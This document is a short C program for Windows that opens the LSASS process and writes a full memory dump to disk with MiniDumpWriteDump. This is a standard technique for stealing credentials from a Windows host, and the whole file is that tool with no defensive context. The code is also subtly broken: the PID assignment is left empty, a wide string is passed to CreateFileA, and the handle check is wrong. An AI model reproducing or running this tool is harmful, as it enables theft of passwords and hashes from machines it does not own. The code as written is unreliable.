#include <stdio.h>
#include <Windows.h>
#include <DbgHelp.h>
#pragma comment(lib, "DbgHelp.lib")

void LSASSDump()
{
	HANDLE lsassProcess;
	int lsassPID = ; // Edit the LSASS PID here
	HANDLE DumpFile = CreateFileA(L"dumpfile.dmp", GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!DumpFile) {
		printf("[!] Error creating dump file! %d\n", GetLastError());
		exit(-1);
	}
	printf("[+] Dump file created successfully!\n");

	lsassProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, lsassPID);
	if (!lsassProcess) {
		printf("[!] Couldn't open LSASS Process! %d\n", GetLastError());
		exit(-1);
	}
	printf("[+] Got a handle to the LSASS Process!\n");

	BOOL ProcDump = MiniDumpWriteDump(lsassProcess, lsassPID, DumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
	if (!ProcDump) {
		printf("[!] Error while calling MiniDumpWriteDump()\n %d", GetLastError());
		exit(-1);
	}
	printf("[+] Successfully conducted memory dump!\n");
}

int main()
{
	LSASSDump();
	return 0;

}
